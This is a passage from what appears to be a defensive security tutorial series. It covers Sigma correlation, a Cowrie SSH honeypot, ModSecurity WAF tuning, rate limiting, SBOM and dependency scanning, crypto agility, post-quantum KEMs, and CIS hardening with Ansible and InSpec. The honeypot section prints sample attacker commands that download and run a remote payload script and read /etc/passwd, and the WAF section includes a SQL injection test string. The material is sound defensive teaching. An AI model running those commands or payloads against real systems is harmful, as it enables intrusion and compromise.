        Initiated: "true" # => Outbound connection initiated by this host
      condition: selection

# Correlation logic
timespan: 5m # => Both events must occur within 5-minute window
group-by:
  - ComputerName # => Correlate events from the same source host
  - SubjectUserName # => Same user account involved in both events
ordered: true # => credential_dump MUST precede smb_new_host
min-count: 1 # => One occurrence of each triggers alert

falsepositives:
  - Legitimate sysadmin tools accessing lsass (e.g., Process Explorer)
  - Backup agents reading memory for VSS snapshots
  - AV/EDR products with deep inspection capabilities
level: high # => High severity; requires analyst investigation
```

**Key Takeaway:** Sigma correlation rules encode multi-event attack patterns in a vendor-neutral format that translates to Splunk, Elastic, Chronicle, and other SIEMs.

**Why It Matters:** Individual security events are low-signal; attackers rely on detection tools focusing on single events while they chain together legitimate-looking actions. Correlation rules that model kill-chain sequences dramatically increase detection fidelity while reducing false positives. Sigma's vendor-neutral format enables sharing detection rules across organizations and translating them to any SIEM, preventing duplication of detection engineering effort across the security community.

---

## Example 69: Honeypot Deployment

**What this covers:** Honeypots are decoy systems that attract attackers and record their techniques. This example deploys Cowrie, a medium-interaction SSH honeypot, and demonstrates log analysis to extract attacker behavior and IOCs (Indicators of Compromise).

**Scenario:** A security team deploys a Cowrie honeypot on an internet-facing IP to collect attacker TTPs (Tactics, Techniques, and Procedures) and build threat intelligence from real attack sessions.

```bash
# Install Cowrie in a dedicated virtualenv (never run as root)
useradd -m -s /bin/bash cowrie           # => Dedicated user account for isolation
su - cowrie

pip3 install virtualenv
virtualenv cowrie-env
source cowrie-env/bin/activate

pip install cowrie                        # => Installs Cowrie and dependencies
# => Cowrie simulates: SSH/Telnet login, fake filesystem, command execution recording

# Configure Cowrie (~cowrie/cowrie/etc/cowrie.cfg)
```

```ini
[honeypot]
hostname = prod-webserver-02              # => Fake hostname to entice attackers
listen_port = 2222                        # => Listen on 2222; redirect port 22 via iptables

# Fake credentials accepted (all logins succeed to maximize data collection)
auth_class = cowrie.core.auth.AuthRandomSuccess
                                          # => Accept ANY username/password combination
                                          # => Attackers try their full wordlist; we log all
fake_addr = 203.0.113.50                  # => Fake internal IP shown in /proc/net/fib_trie

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json
                                          # => Structured JSON log for SIEM ingestion

[output_splunk]
enabled = false                           # => Enable to ship events to Splunk HEC
```

```bash
# Redirect port 22 to Cowrie on 2222 (run as root)
iptables -t nat -A PREROUTING \
  -p tcp --dport 22 \
  -j REDIRECT --to-port 2222
# => Attackers scanning port 22 transparently hit Cowrie on 2222

# Start Cowrie
cowrie start                              # => Daemonizes; logs to var/log/cowrie/

# === Log analysis after attack sessions ===
# Parse JSON log to extract commands attackers ran
jq -r 'select(.eventid=="cowrie.command.input") | "\(.src_ip) \(.input)"' \
  ~cowrie/var/log/cowrie/cowrie.json \
  | sort | uniq -c | sort -rn | head -20
# => Output (example):
#  47 185.220.101.5  wget http://malc2.ru/payload.sh
#  39 185.220.101.5  chmod +x payload.sh && ./payload.sh
#  31 103.14.122.8   cat /etc/passwd
#  28 103.14.122.8   uname -a
# => Reveals download URLs, C2 infrastructure, and reconnaissance commands

# Extract unique C2 URLs from download commands
jq -r 'select(.eventid=="cowrie.command.input") | .input' \
  ~cowrie/var/log/cowrie/cowrie.json \
  | grep -oP '(https?://[^\s]+)' \
  | sort -u
# => Lists malware download URLs for threat intelligence feeds and blocking
```

**Key Takeaway:** Honeypots provide high-fidelity threat intelligence with near-zero false positives — any interaction with a honeypot is inherently suspicious activity.

**Why It Matters:** Defensive tools generate alerts from legitimate traffic, creating noise. Honeypots have no legitimate users, so every connection is an attack signal. The commands, malware URLs, and lateral movement techniques recorded by Cowrie reveal current attacker toolkits, credential lists in use, and C2 infrastructure. This intelligence feeds blocklists, tunes IDS rules, and informs incident response playbooks with real adversary behavior rather than theoretical models.

---

## Example 70: ModSecurity WAF Configuration

**What this covers:** ModSecurity is an open-source Web Application Firewall that inspects HTTP requests against OWASP Core Rule Set (CRS) rules, blocking SQL injection, XSS, path traversal, and other web attacks. This example integrates ModSecurity with nginx and configures key CRS parameters.

**Scenario:** A web application lacks input validation at the application layer. A WAF provides a detection and blocking layer while the development team remediates root-cause vulnerabilities.

```nginx
# nginx ModSecurity integration
# nginx.conf main block additions

load_module modules/ngx_http_modsecurity_module.so;
                                          # => Load ModSecurity dynamic module

http {
    modsecurity on;                       # => Enable ModSecurity globally
    modsecurity_rules_file /etc/modsecurity/modsecurity.conf;
                                          # => Main ModSecurity configuration

    server {
        listen 443 ssl;
        server_name app.example.com;

        modsecurity on;                   # => Enable per-server (can be per-location too)
        modsecurity_rules_file /etc/modsecurity/crs-setup.conf;
                                          # => CRS-specific tunables
        modsecurity_rules_file /etc/modsecurity/rules/*.conf;
                                          # => OWASP CRS rule files (920xxx-980xxx)
        modsecurity_rules_file /etc/modsecurity/custom-exclusions.conf;
                                          # => Site-specific false-positive exclusions

        location / {
            proxy_pass http://backend:8080;
        }
    }
}
```

```apache
# /etc/modsecurity/crs-setup.conf — Key CRS parameters

# Anomaly scoring mode (recommended over traditional blocking mode)
SecDefaultAction "phase:1,log,auditlog,pass"
SecDefaultAction "phase:2,log,auditlog,pass"
                                          # => Detect mode: log but don't block (tune first)
# Change 'pass' to 'deny,status:403' after baseline established

# Paranoia level: 1 (default) through 4 (strictest)
SecAction "id:900000, \
  phase:1, \
  nolog, \
  pass, \
  t:none, \
  setvar:tx.paranoia_level=2"
# => PL2 adds stricter rules; PL3/4 for highly sensitive apps (high false-positive rate)

# Inbound anomaly score threshold
SecAction "id:900110, \
  phase:1, \
  nolog, \
  pass, \
  t:none, \
  setvar:tx.inbound_anomaly_score_threshold=5"
# => Block request when accumulated rule score exceeds 5
# => Critical rules score 5; high score 4; medium 3; low 2 — one critical = block

# Exclusion for a known false positive (e.g., admin upload endpoint)
SecRule REQUEST_URI "@beginsWith /admin/upload" \
    "id:1000001, \
    phase:1, \
    pass, \
    nolog, \
    ctl:ruleRemoveById=200002"
# => Disable CRS rule 200002 for upload endpoint to prevent false-positive blocking
# => Document every exclusion with ticket number and reviewer

# Test the WAF — should return 403
# curl "https://app.example.com/?id=1'+OR+'1'='1"
# => SQL injection pattern triggers CRS rule 942100; score 5; blocked
```

**Key Takeaway:** A WAF in anomaly-scoring mode accumulates risk scores across multiple weak signals, blocking sophisticated evasion attempts that no single rule would catch.

**Why It Matters:** Application code often contains input validation gaps, especially in legacy systems or third-party components. A WAF provides a compensating control that buys time for proper remediation. The CRS anomaly scoring model reduces false positives compared to per-rule blocking while catching evasion attempts that split malicious input across multiple parameters. WAFs do not replace secure coding but serve as an essential defense-in-depth layer.

---

## Example 71: DDoS Mitigation with Rate Limiting

**What this covers:** DDoS mitigation at the server level uses rate limiting in both nftables (layer 3/4) and nginx (layer 7) to drop volumetric attacks before they exhaust application resources. This example implements a two-layer defense combining kernel-level packet filtering with HTTP-layer throttling.

**Scenario:** A web application faces periodic HTTP flood attacks from botnets. The team implements nftables + nginx rate limiting to absorb attack traffic without provisioning additional servers.

```bash
# Layer 1: nftables packet-level rate limiting (before nginx processes requests)
# Add to nftables.conf input chain:
```

```nftables
table inet filter {
    # Per-source-IP connection rate tracking
    set http_ratelimit {
        type ipv4_addr
        flags dynamic                     # => Entries created automatically
        timeout 60s                       # => Reset counter after 60 seconds of inactivity
    }

    chain input {
        type filter hook input priority 0; policy drop;

        ct state established,related accept

        # HTTP/HTTPS: limit new connections per source IP to 50/minute
        tcp dport { 80, 443 } ct state new \
            meter http_meter \
            { ip saddr limit rate over 50/minute burst 20 packets } \
            drop
        # => burst 20: allow short bursts of 20 packets before applying limit
        # => Drops connect attempts from sources exceeding 50 new conn/min
        # => Legitimate browsers rarely exceed 10-15 connections/minute

        tcp dport { 80, 443 } accept       # => Pass remaining traffic to nginx

        # SYN flood protection
        tcp flags syn limit rate over 1000/second drop
        # => Drop SYN packets when rate exceeds 1000/sec (SYN flood indicator)
    }
}
```

```nginx
# Layer 2: nginx HTTP-level rate limiting (application-aware throttling)

http {
    # Define rate limit zones in memory
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    # => Zone "api": 10 MB shared memory, 10 requests/second per IP
    # => 10 MB stores ~160,000 IP state entries

    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    # => Zone "login": stricter limit — 1 request/second per IP
    # => Prevents credential stuffing at the login endpoint

    limit_conn_zone $binary_remote_addr zone=connlimit:10m;
    # => Track concurrent connections per IP

    server {
        listen 443 ssl;

        # Global connection limit per IP
        limit_conn connlimit 20;          # => Max 20 concurrent connections per source IP

        location /api/ {
            limit_req zone=api burst=20 nodelay;
            # => Allow burst of 20; process immediately (nodelay); then enforce 10r/s
            # => Returns HTTP 429 when limit exceeded
            limit_req_status 429;         # => RFC 6585 Too Many Requests

            proxy_pass http://backend:8080;
        }

        location /api/auth/login {
            limit_req zone=login burst=5 nodelay;
            # => Login: max 1r/s steady, burst 5 — stops credential stuffing
            limit_req_status 429;

            proxy_pass http://backend:8080;
        }

        # Custom 429 response with Retry-After header
        error_page 429 /429.html;
        location = /429.html {
            add_header Retry-After 60;    # => Tell client when to retry
            return 429 '{"error":"rate_limit_exceeded","retry_after":60}';
        }
    }
}
```

**Key Takeaway:** Two-layer rate limiting at kernel and application levels stops volumetric attacks early while providing per-endpoint granularity to protect sensitive operations like login.

**Why It Matters:** A single rate-limit layer can be overwhelmed by large botnets or bypassed by spreading requests across many IPs. nftables drops packets in kernel space before nginx allocates memory, preserving server capacity. nginx's zone-based limiting enables endpoint-specific policies, protecting login endpoints from credential stuffing without over-restricting normal API usage. Together they provide defense in depth against HTTP flood, SYN flood, and application-layer DDoS.

---

## Example 72: Supply Chain Security

**What this covers:** Software supply chain attacks inject malicious code through compromised dependencies. This example uses `pip-audit` to detect known CVEs in Python dependencies and `syft` to generate a Software Bill of Materials (SBOM) for a Python application.

**Scenario:** A DevSecOps team adds supply chain security gates to a Python microservice CI pipeline, ensuring every release has a clean vulnerability scan and an auditable SBOM artifact.

```bash
#!/usr/bin/env bash
# supply-chain-check.sh — Audit Python dependencies and generate SBOM

APP_DIR="/opt/myapp"
SBOM_OUTPUT="/var/security/sbom-$(date +%Y%m%d).json"

# Step 1: Audit Python dependencies for known CVEs using pip-audit
echo "=== pip-audit: CVE scan ==="
cd "$APP_DIR"

pip-audit \
  --requirement requirements.txt \   # => Scan pinned requirements file
  --format json \
  --output /tmp/pip-audit-results.json \
  --desc on                          # => Include vulnerability descriptions
# => Queries PyPI Advisory Database and OSV (Open Source Vulnerabilities)
# => Example output: PYSEC-2024-47 in requests==2.28.0 (CVSS 7.5, HTTP redirect vuln)

# Parse results and fail pipeline on any HIGH/CRITICAL findings
VULN_COUNT=$(jq '[.[] | select(.vulns | length > 0)] | length' /tmp/pip-audit-results.json)
echo "Packages with vulnerabilities: $VULN_COUNT"

CRITICAL_COUNT=$(jq '[.[] | .vulns[] | select(.fix_versions | length > 0)] | length' \
  /tmp/pip-audit-results.json)
echo "Fixable vulnerabilities: $CRITICAL_COUNT"
# => Fixable = upstream has released a patched version

if [ "$VULN_COUNT" -gt 0 ]; then
    echo "FAIL: Supply chain vulnerabilities found — review /tmp/pip-audit-results.json"
    jq -r '.[] | select(.vulns | length > 0) | "\(.name)==\(.version): \(.vulns[].id)"' \
      /tmp/pip-audit-results.json     # => Print each vulnerable package and CVE ID
    exit 1                            # => Block CI pipeline; do not deploy
fi

echo "PASS: No known CVEs in dependencies"

# Step 2: Generate SBOM with syft (supports CycloneDX, SPDX, Syft native formats)
echo "=== syft: SBOM generation ==="

syft "$APP_DIR" \
  --output cyclonedx-json="$SBOM_OUTPUT" \
  --scope all-layers                 # => Include all filesystem layers (not just top layer)
# => Discovers: Python packages, OS packages, binaries with embedded version strings
# => Outputs CycloneDX 1.4 JSON with component names, versions, CPE, PURL

echo "SBOM written to: $SBOM_OUTPUT"
jq '.metadata.component.name, (.components | length)' "$SBOM_OUTPUT"
# => Output: "myapp" | 187 (component name and total component count)
# => SBOM archived as release artifact for compliance and incident response
```

**Key Takeaway:** Automated dependency auditing and SBOM generation make supply chain risk visible and blockable in CI/CD pipelines before vulnerable components reach production.

**Why It Matters:** The SolarWinds and Log4Shell incidents demonstrated that attackers compromise software supply chains to reach thousands of downstream targets simultaneously. pip-audit catches known CVEs before deployment; the SBOM provides a complete inventory for rapid impact assessment when new vulnerabilities are disclosed. SBOM generation is now mandated by US Executive Order 14028 for software sold to federal agencies, making it a baseline expectation for enterprise software.

---

## Example 73: Software Composition Analysis

**What this covers:** Software Composition Analysis (SCA) scans container images for known vulnerabilities in OS packages and language runtime libraries. This example uses `grype` to scan a container image and produce a severity-tiered vulnerability report.

**Scenario:** A security team scans every container image in the CI pipeline before pushing to the registry, blocking any image with critical vulnerabilities from reaching production.

```bash
#!/usr/bin/env bash
# container-sca.sh — Scan container image with grype

IMAGE="${1:-myapp:latest}"             # => Image to scan (passed as argument)
REPORT_DIR="/var/security/sca-reports"
REPORT_FILE="$REPORT_DIR/grype-$(echo $IMAGE | tr ':/' '--')-$(date +%Y%m%d).json"

mkdir -p "$REPORT_DIR"

echo "=== grype: SCA scan of $IMAGE ==="

# Run grype scan; output structured JSON for automated processing
grype "$IMAGE" \
  --output json \
  --file "$REPORT_FILE" \
  --fail-on critical               # => Exit code 1 if any CRITICAL vulnerability found
# => grype queries: NVD, GitHub Security Advisories, RedHat CVE DB, Ubuntu USN
# => Matches: OS packages (dpkg/rpm), Python (pip), Node (npm), Go modules, Java JARs

GRYPE_EXIT=$?                      # => Capture exit code before further commands

# Parse results for summary
echo ""
echo "=== Vulnerability Summary ==="
jq -r '
  .matches
  | group_by(.vulnerability.severity)
  | .[]
  | "\(.[0].vulnerability.severity): \(length)"
' "$REPORT_FILE"
# => Output:
# Critical: 2
# High: 7
# Medium: 14
# Low: 31
# Negligible: 8

# List critical findings with fix versions
echo ""
echo "=== Critical Vulnerabilities ==="
jq -r '
  .matches[]
  | select(.vulnerability.severity == "Critical")
  | "\(.artifact.name) \(.artifact.version) → fix: \(.vulnerability.fix.versions[0] // "no fix")"
' "$REPORT_FILE"
# => Output (example):
# openssl 3.0.2 → fix: 3.0.7   (CVE-2022-3786, CVSS 9.1)
# libexpat 2.4.1 → fix: 2.5.0  (CVE-2022-40674, CVSS 9.8)

# Exit with grype's exit code (non-zero blocks CI pipeline)
exit $GRYPE_EXIT
```

**Key Takeaway:** Container image scanning catches vulnerabilities in base images and OS packages that application-level dependency audits miss entirely.

**Why It Matters:** Application dependency scanners only see language packages; container images also contain OS libraries, interpreters, and utilities with their own CVE histories. A Node.js app running on Ubuntu 22.04 may have zero npm vulnerabilities while carrying critical OpenSSL or glibc vulnerabilities. Grype's multi-ecosystem support and registry integration make it practical to scan every image in CI without manual intervention, shifting vulnerability discovery left before deployment.

---

## Example 74: SBOM Generation and CycloneDX Format

**What this covers:** CycloneDX is an OWASP-maintained SBOM standard providing machine-readable component inventories with vulnerability data linkage. This example generates a CycloneDX SBOM for a Node.js project using `cdxgen` and explains the key fields.

**Scenario:** A software vendor must provide a CycloneDX SBOM with every release to comply with customer procurement requirements and US Executive Order 14028.

```bash
# Install cdxgen (CycloneDX generator supporting 20+ ecosystems)
npm install -g @cyclonedx/cdxgen    # => Installs cdxgen CLI globally

# Generate CycloneDX 1.6 SBOM for a Node.js project
cdxgen \
  --output sbom.json \
  --type nodejs \                    # => Ecosystem type (nodejs, python, java, golang, etc.)
  --spec-version 1.6 \              # => CycloneDX schema version
  --project-name "myapp" \
  --project-version "2.4.1" \
  /opt/myapp                         # => Project root directory
# => Scans: package.json, package-lock.json, node_modules/
# => Discovers all direct and transitive dependencies with versions and checksums
```

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "serialNumber": "urn:uuid:a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "version": 1,
  "metadata": {
    "timestamp": "2026-05-21T00:00:00Z",
    "component": {
      "type": "application",
      "name": "myapp",
      "version": "2.4.1",
      "purl": "pkg:npm/myapp@2.4.1"
    },
    "tools": [{ "vendor": "CycloneDX", "name": "cdxgen", "version": "10.x" }]
  },
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "hashes": [{ "alg": "SHA-256", "content": "abc123...def456" }],
      "licenses": [{ "license": { "id": "MIT" } }]
    },
    {
      "type": "library",
      "name": "lodash",
      "version": "4.17.21",
      "purl": "pkg:npm/lodash@4.17.21",
      "hashes": [{ "alg": "SHA-256", "content": "fed987...cba654" }]
    }
  ],
  "vulnerabilities": [
    {
      "id": "CVE-2021-23337",
      "source": { "name": "NVD", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337" },
      "ratings": [{ "score": 7.2, "severity": "high", "method": "CVSSv3" }],
      "affects": [{ "ref": "pkg:npm/lodash@4.17.21" }],
      "recommendation": "Upgrade to lodash >= 4.17.21 with patch applied"
    }
  ]
}
```

```bash
# Validate the generated SBOM against CycloneDX schema
cdxgen validate --input sbom.json --spec-version 1.6
# => Output: SBOM is valid CycloneDX 1.6

# Enrich SBOM with vulnerability data using grype
grype sbom:sbom.json --output cyclonedx-json > sbom-with-vulns.json
# => Appends vulnerabilities section to components already in SBOM

# Sign the SBOM for integrity verification
openssl dgst -sha256 -sign signing.key -out sbom.json.sig sbom.json
# => Digital signature ensures SBOM was not tampered with after generation
```

**Key Takeaway:** CycloneDX SBOMs provide machine-readable component inventories that enable automated vulnerability correlation and compliance attestation throughout the software lifecycle.

**Why It Matters:** When a critical vulnerability like Log4Shell is disclosed, organizations with SBOMs can query their inventory in minutes to identify every affected system. Without SBOMs, impact assessment requires manual repository trawling across hundreds of services. CycloneDX's standardized PURL identifiers enable automated matching against vulnerability databases, making SBOMs the foundation of modern software supply chain security programs.

---

## Example 75: Cryptographic Agility

**What this covers:** Cryptographic agility is a design pattern that abstracts cipher selection from application code, enabling algorithm upgrades without code changes. This example implements a Python encryption abstraction that separates algorithm configuration from encryption logic.

**Scenario:** A security team needs to migrate from AES-128-CBC to AES-256-GCM across a service fleet. With cryptographic agility, the migration changes a configuration value rather than application code in dozens of services.

```python
#!/usr/bin/env python3
# crypto_agility.py — Cryptographic agility abstraction

import os
from abc import ABC, abstractmethod
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
                                            # => AEAD ciphers: authenticated encryption

# Abstract base defines the interface; concrete implementations provide algorithms
class SymmetricCipher(ABC):
    @abstractmethod
    def encrypt(self, plaintext: bytes, aad: bytes = b"") -> bytes:
        """Encrypt plaintext; return nonce + ciphertext."""

    @abstractmethod
    def decrypt(self, ciphertext: bytes, aad: bytes = b"") -> bytes:
        """Decrypt nonce + ciphertext; raise on authentication failure."""


class AES256GCMCipher(SymmetricCipher):
    """AES-256-GCM: current recommended default."""
    NONCE_SIZE = 12                         # => 96-bit nonce (GCM standard)

    def __init__(self, key: bytes):
        assert len(key) == 32, "AES-256 requires 32-byte key"
                                            # => 256 bits; never use 128-bit in new code
        self._cipher = AESGCM(key)

    def encrypt(self, plaintext: bytes, aad: bytes = b"") -> bytes:
        nonce = os.urandom(self.NONCE_SIZE) # => Fresh random nonce per encryption
        ct = self._cipher.encrypt(nonce, plaintext, aad)
                                            # => aad is authenticated but not encrypted
        return nonce + ct                   # => Prepend nonce for storage/transmission

    def decrypt(self, data: bytes, aad: bytes = b"") -> bytes:
        nonce, ct = data[:self.NONCE_SIZE], data[self.NONCE_SIZE:]
        return self._cipher.decrypt(nonce, ct, aad)
                                            # => Raises InvalidTag if ciphertext tampered


class ChaCha20Poly1305Cipher(SymmetricCipher):
    """ChaCha20-Poly1305: preferred on platforms without AES hardware acceleration."""
    NONCE_SIZE = 12

    def __init__(self, key: bytes):
        assert len(key) == 32
        self._cipher = ChaCha20Poly1305(key)

    def encrypt(self, plaintext: bytes, aad: bytes = b"") -> bytes:
        nonce = os.urandom(self.NONCE_SIZE)
        return nonce + self._cipher.encrypt(nonce, plaintext, aad)

    def decrypt(self, data: bytes, aad: bytes = b"") -> bytes:
        nonce, ct = data[:self.NONCE_SIZE], data[self.NONCE_SIZE:]
        return self._cipher.decrypt(nonce, ct, aad)


# Factory reads algorithm from environment/config — no code change needed to switch
CIPHER_REGISTRY = {
    "AES256GCM": AES256GCMCipher,           # => Default: hardware-accelerated, FIPS 140
    "CHACHA20": ChaCha20Poly1305Cipher,     # => Fallback: constant-time on all platforms
}

def get_cipher(key: bytes, algorithm: str = None) -> SymmetricCipher:
    algo = algorithm or os.environ.get("CIPHER_ALGORITHM", "AES256GCM")
                                            # => Read from env; default to AES256GCM
    cls = CIPHER_REGISTRY.get(algo)
    if not cls:
        raise ValueError(f"Unknown cipher: {algo}. Allowed: {list(CIPHER_REGISTRY)}")
    return cls(key)


# --- Demonstration ---
key = os.urandom(32)                        # => 256-bit key from secure random source

cipher = get_cipher(key)                    # => Uses CIPHER_ALGORITHM env var
ct = cipher.encrypt(b"sensitive payload", aad=b"request-id-42")
# => Returns: 12-byte nonce + ciphertext + 16-byte GCM auth tag

pt = cipher.decrypt(ct, aad=b"request-id-42")
print(pt)                                   # => b'sensitive payload' (verified)
```

**Key Takeaway:** Cryptographic agility decouples algorithm selection from business logic, enabling security-driven algorithm migrations without application code changes or service redeployments.

**Why It Matters:** MD5 was once considered secure; SHA-1 followed; AES-128-CBC is now deprecated for new applications. Without agility, each algorithm migration requires touching every service that performs encryption. The factory pattern shown here centralizes algorithm selection in configuration, reducing migration risk and enabling emergency algorithm rotation if a cryptographic break is discovered. This is particularly critical for post-quantum migration where many systems will need simultaneous updates.

---

## Example 76: Post-Quantum Cryptography Introduction

**What this covers:** Post-quantum cryptography (PQC) uses algorithms resistant to attacks by quantum computers. This example demonstrates CRYSTALS-Kyber Key Encapsulation Mechanism (KEM) using the `liboqs` Python bindings for key exchange, replacing RSA/ECDH which quantum computers can break.

**Scenario:** A security architect evaluates NIST-standardized PQC algorithms (ML-KEM, formerly Kyber) for integration into a TLS 1.3 hybrid key exchange, preparing for the "harvest now, decrypt later" threat.

```python
#!/usr/bin/env python3
# pqc_kem_demo.py — Post-quantum key encapsulation with ML-KEM (Kyber)
# Requires: pip install oqs (liboqs Python wrapper)

import oqs                                  # => Open Quantum Safe library bindings

# List available KEM algorithms
print("Available KEMs:", oqs.get_enabled_kem_mechanisms()[:5])
# => ['BIKE-L1', 'BIKE-L3', 'BIKE-L5', 'Classic-McEliece-348864', 'Frodo-640-AES', ...]
# => ML-KEM-768 is NIST FIPS 203 standard (Kyber-768 standardized 2024)

ALGORITHM = "ML-KEM-768"                    # => NIST FIPS 203 Level 3 (128-bit post-quantum)

# === KEY GENERATION (recipient side) ===
with oqs.KeyEncapsulation(ALGORITHM) as recipient:
    public_key = recipient.generate_keypair()
    # => public_key: 1184 bytes (compare: RSA-2048 pubkey = 294 bytes)
    # => Private key stored internally in the KEM object
    print(f"Public key size:  {len(public_key)} bytes")
    # => 1184 bytes (larger than classical keys, but still practical)

    # === ENCAPSULATION (sender side — uses only public key) ===
    with oqs.KeyEncapsulation(ALGORITHM) as sender:
        ciphertext, shared_secret_sender = sender.encap_secret(public_key)
        # => ciphertext: 1088 bytes (sent to recipient)
        # => shared_secret_sender: 32 bytes (used as symmetric key material)
        print(f"Ciphertext size:  {len(ciphertext)} bytes")
        print(f"Shared secret:    {shared_secret_sender.hex()[:16]}... ({len(shared_secret_sender)} bytes)")
        # => Sender never sends the shared secret directly; only the ciphertext

    # === DECAPSULATION (recipient side) ===
    shared_secret_recipient = recipient.decap_secret(ciphertext)
    # => Recipient derives same shared secret using private key + ciphertext
    print(f"Secrets match:    {shared_secret_sender == shared_secret_recipient}")
    # => True — both sides have the same 32-byte shared secret

# === HYBRID KEY EXCHANGE (classical + PQC) ===
# In practice, combine with X25519 for defense-in-depth:
# final_key = HKDF(ikm = x25519_secret || kyber_secret, ...)
# => Classical component protects against classical attacks
# => PQC component protects against future quantum attacks
# => Both must be broken simultaneously; provides stronger guarantee than either alone
```

**Key Takeaway:** ML-KEM (Kyber) provides key encapsulation resistant to quantum attacks, with practical key and ciphertext sizes suitable for use alongside classical algorithms in hybrid TLS.

**Why It Matters:** Quantum computers running Shor's algorithm can break RSA and elliptic curve cryptography. The "harvest now, decrypt later" attack stores today's encrypted traffic for decryption after quantum computers become available — making PQC migration urgent for long-lived sensitive data. NIST finalized ML-KEM, ML-DSA, and SLH-DSA in 2024. TLS 1.3 already supports hybrid key exchange in drafts; organizations encrypting data that must remain confidential for 10+ years should begin PQC migration planning now.

---

## Example 77: Security Automation with Ansible

**What this covers:** Infrastructure hardening applied manually is inconsistent and difficult to audit. Ansible playbooks encode hardening controls as idempotent tasks that run identically across thousands of servers. This example implements CIS Benchmark hardening tasks for Linux.

**Scenario:** A cloud operations team must harden a fleet of 500 Ubuntu servers to CIS Level 1 before a compliance audit. An Ansible playbook applies controls consistently and produces a change log.

```yaml
# hardening-playbook.yml — CIS Benchmark Level 1 hardening for Ubuntu 22.04
---
- name: CIS Level 1 Server Hardening
  hosts: all
  become: true # => Run as root via sudo
  gather_facts: true

  vars:
    ssh_port: 2222 # => Non-default SSH port reduces automated scanning
    max_auth_tries: 3 # => CIS 5.2.7: limit SSH auth attempts
    login_banner: |
      Authorized access only. All activity is monitored and logged.

  tasks:
    # CIS 1.1.1 — Disable unused filesystems
    - name: Disable cramfs filesystem module
      community.general.modprobe:
        name: cramfs
        state: absent # => Removes kernel module; loaded = attack surface
      # => cramfs, squashfs, udf are rarely needed; remove to reduce kernel attack surface

    # CIS 3.1.1 — Disable IP forwarding
    - name: Disable IPv4 forwarding
      ansible.posix.sysctl:
        name: net.ipv4.ip_forward
        value: "0"
        sysctl_set: true
        reload: true # => Applies immediately; persists across reboots
      # => Prevents server from routing packets between interfaces (not a router)

    # CIS 3.3.1 — Disable source routing
    - name: Disable source routed packet acceptance
      ansible.posix.sysctl:
        name: "{{ item }}"
        value: "0"
        sysctl_set: true
      loop:
        - net.ipv4.conf.all.accept_source_route
        - net.ipv4.conf.default.accept_source_route
        - net.ipv6.conf.all.accept_source_route
      # => Source routing allows sender to specify packet path; used in MITM attacks

    # CIS 5.2 — SSH hardening
    - name: Configure SSH daemon
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: "^#?{{ item.key }}"
        line: "{{ item.key }} {{ item.value }}"
        validate: "/usr/sbin/sshd -t -f %s" # => Validate config before writing
      loop:
        - { key: Port, value: "{{ ssh_port }}" }
        - { key: PermitRootLogin, value: "no" } # => CIS 5.2.10
        - { key: MaxAuthTries, value: "{{ max_auth_tries }}" }
        - { key: PasswordAuthentication, value: "no" } # => Keys only
        - { key: PermitEmptyPasswords, value: "no" }
        - { key: X11Forwarding, value: "no" } # => No GUI forwarding
        - { key: AllowAgentForwarding, value: "no" }
        - { key: ClientAliveInterval, value: "300" } # => Disconnect idle after 5 min
        - { key: ClientAliveCountMax, value: "2" }
      notify: Restart SSH # => Handler restarts sshd after config change

    # CIS 1.7 — Login banner
    - name: Set login warning banner
      ansible.builtin.copy:
        content: "{{ login_banner }}"
        dest: /etc/issue.net
        owner: root
        group: root
        mode: "0644" # => World-readable; root-owned

    # CIS 6.1 — File permissions
    - name: Set /etc/passwd permissions (CIS 6.1.2)
      ansible.builtin.file:
        path: /etc/passwd
        owner: root
        group: root
        mode: "0644" # => Readable by all; writable only by root

    - name: Set /etc/shadow permissions (CIS 6.1.3)
      ansible.builtin.file:
        path: /etc/shadow
        owner: root
        group: shadow
        mode: "0640" # => Readable by root and shadow group only

  handlers:
    - name: Restart SSH
      ansible.builtin.service:
        name: sshd
        state: restarted # => Only runs if SSH config task reported changed
```

**Key Takeaway:** Ansible playbooks make security hardening repeatable, auditable, and idempotent — the same playbook can harden a new server or verify and repair drift on an existing one.

**Why It Matters:** Manual hardening checklists applied by different administrators produce inconsistent results and leave no audit trail. Ansible playbooks encode the same controls as executable documentation, ensuring every server in a fleet reaches an identical hardened state. Idempotency means re-running the playbook detects and corrects configuration drift caused by administrative changes or software updates. This approach is foundational to compliance-as-code programs targeting PCI DSS, SOC 2, and ISO 27001.

---

## Example 78: Compliance as Code with InSpec

**What this covers:** InSpec translates compliance controls (CIS, PCI DSS, NIST 800-53) into executable tests that produce machine-readable pass/fail evidence. This example implements an InSpec profile checking CIS benchmark controls on a Linux server.

**Scenario:** A compliance team must produce evidence that production servers meet CIS Level 1 controls for a SOC 2 audit. InSpec profiles run automatically and produce audit reports without manual inspection.

```ruby
# inspec-cis-linux/controls/cis_level1.rb
# InSpec profile: CIS Ubuntu Linux 22.04 LTS Benchmark Level 1

title "CIS Ubuntu 22.04 Level 1 — Selected Controls"

# CIS 1.1.1.1 — Ensure mounting of cramfs filesystems is disabled
control "cis-1.1.1.1" do
  impact 1.0                              # => 1.0 = critical; 0.7 = high; 0.5 = medium
  title "Ensure mounting of cramfs filesystems is disabled"
  desc "cramfs is a compressed read-only Linux filesystem. Rarely needed in production."
  tag cis: "1.1.1.1"
  tag severity: "low"

  describe kernel_module("cramfs") do     # => InSpec resource: checks kernel module state
    it { should_not be_loaded }           # => PASS if cramfs not currently loaded
    it { should be_disabled }             # => PASS if blacklisted from auto-loading
  end
end

# CIS 3.1.1 — Ensure IP forwarding is disabled
control "cis-3.1.1" do
  impact 0.7
  title "Ensure IP forwarding is disabled"
  desc "IP forwarding allows the server to route packets between network interfaces."

  describe kernel_parameter("net.ipv4.ip_forward") do
    its("value") { should eq 0 }          # => sysctl net.ipv4.ip_forward must be 0
  end

  describe kernel_parameter("net.ipv6.conf.all.forwarding") do
    its("value") { should eq 0 }          # => IPv6 forwarding also disabled
  end
end

# CIS 5.2.10 — Ensure SSH root login is disabled
control "cis-5.2.10" do
  impact 1.0
